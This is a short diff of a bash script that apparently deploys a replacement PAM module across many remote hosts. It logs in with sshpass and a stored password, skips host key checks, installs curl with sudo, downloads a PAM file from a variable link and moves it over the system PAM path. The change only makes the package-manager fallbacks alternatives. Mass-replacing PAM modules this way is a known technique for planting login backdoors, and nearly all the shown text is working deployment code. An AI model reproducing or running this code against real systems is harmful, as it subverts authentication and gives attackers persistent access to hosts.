@@ -33,9 +33,9 @@ main() {
             sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$path_to_tmp_pam" "$username@$IP:$path_to_pam" && \
             echo "SUCCESS        (SCP): $IP" || \
             sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$username@$IP" "
-                echo \"$password\" | sudo -S apt install -y curl && \
-                echo \"$password\" | sudo -S yum install -y curl && \
-                echo \"$password\" | sudo -S zypper install -y curl && \
+                echo \"$password\" | sudo -S apt install -y curl || \
+                echo \"$password\" | sudo -S yum install -y curl || \
+                echo \"$password\" | sudo -S zypper install -y curl || \
                 echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \
                 echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\" && \
                 echo \"$password\" | sudo -S mv \"$path_to_tmp_pam\" \"$path_to_pam\"
